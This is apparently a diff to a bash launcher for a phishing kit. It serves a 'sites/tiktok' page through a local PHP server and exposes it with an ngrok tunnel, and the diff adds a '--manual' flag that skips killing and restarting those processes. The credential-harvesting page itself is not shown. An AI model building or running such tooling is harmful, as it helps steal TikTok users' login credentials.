@@ -23,10 +23,18 @@ clear
 exit
 fi
 
+MANUAL_START=false
+# Check for manual start flag
+if [[ $1 == "--manual" ]]; then
+       MANUAL_START=true
+fi
+
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
-kill -9 $php
-kill -9 $ngrok
+if [ "$MANUAL_START" = false ]; then
+       kill -9 $php
+       kill -9 $ngrok
+fi
 clear
 bash Logo.sh
 cat Logo.txt | lolcat
@@ -41,29 +49,33 @@ echo ""
                            cd sites/ 
                            cd tiktok/
                            echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                                             php -S 127.0.0.1:4444 > /dev/null 2>&1 &
-                                             sleep 3
+                                             echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                                             echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
+                                             echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                                             if [ "$MANUAL_START" = false ]; then
+                                                    php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+                                                    sleep 3
+                                             fi
                                              # Check if PHP server started
                                              if pgrep -f "php -S 127.0.0.1:4444" > /dev/null; then
-                                                    echo -e "\e[1;32m[OK] PHP server started successfully.\e[0m"
+                                                    echo -e "\e[1;32m[OK] PHP server running.\e[0m"
                                              else
-                                                    echo -e "\e[1;31m[ERROR] PHP server failed to start.\e[0m"
+                                                    echo -e "\e[1;31m[ERROR] PHP server not running.\e[0m"
                                                     exit 1
                                              fi
                            echo ""
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
-                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
-                                             ./ngrok http 4444 > /dev/null 2>&1 &
-                                             sleep 5
+                                             echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                                             echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
+                                             echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
+                                             if [ "$MANUAL_START" = false ]; then
+                                                    ./ngrok http 4444 > /dev/null 2>&1 &
+                                                    sleep 5
+                                             fi
                                              # Check if ngrok started
                                              if pgrep -f "ngrok http 4444" > /dev/null; then
-                                                    echo -e "\e[1;32m[OK] ngrok started successfully.\e[0m"
+                                                    echo -e "\e[1;32m[OK] ngrok running.\e[0m"
                                              else
-                                                    echo -e "\e[1;31m[ERROR] ngrok failed to start.\e[0m"
+                                                    echo -e "\e[1;31m[ERROR] ngrok not running.\e[0m"
                                                     exit 1
                                              fi
                                              # Check if ngrok tunnel is available
@@ -72,7 +84,9 @@ echo ""
                                                     echo -e "\e[1;31m[ERROR] ngrok tunnel not established.\e[0m"
                                                     exit 1
                                              fi
-                                             sleep 20
+                                             if [ "$MANUAL_START" = false ]; then
+                                                    sleep 20
+                                             fi
                            clear
                            echo ""
                            # link already set above
